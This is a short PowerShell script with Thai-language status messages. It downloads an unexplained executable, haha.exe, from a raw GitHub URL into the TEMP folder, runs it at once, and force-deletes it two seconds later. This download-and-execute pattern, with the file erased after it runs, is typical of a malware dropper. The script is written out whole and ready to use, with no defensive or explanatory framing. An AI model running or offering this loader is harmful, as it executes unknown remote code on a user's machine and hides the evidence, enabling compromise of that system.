$url = "https://raw.githubusercontent.com/auden131313/zxc/main/haha.exe"
$temp = "$env:TEMP\haha.exe"

Write-Host "กำลังดาวน์โหลด..." -ForegroundColor Cyan

try {
    Invoke-WebRequest -Uri $url -OutFile $temp -ErrorAction Stop
    Write-Host "✅ ดาวน์โหลดเสร็จ" -ForegroundColor Green
    Write-Host "🚀 รัน haha.exe..." -ForegroundColor Yellow
    & $temp
    Start-Sleep 2
    Remove-Item $temp -Force -ErrorAction SilentlyContinue
    Write-Host "✅ เสร็จ" -ForegroundColor Green
} catch {
    Write-Host "❌ Error: $_" -ForegroundColor Red
    Read-Host "กด Enter เพื่อปิด"
}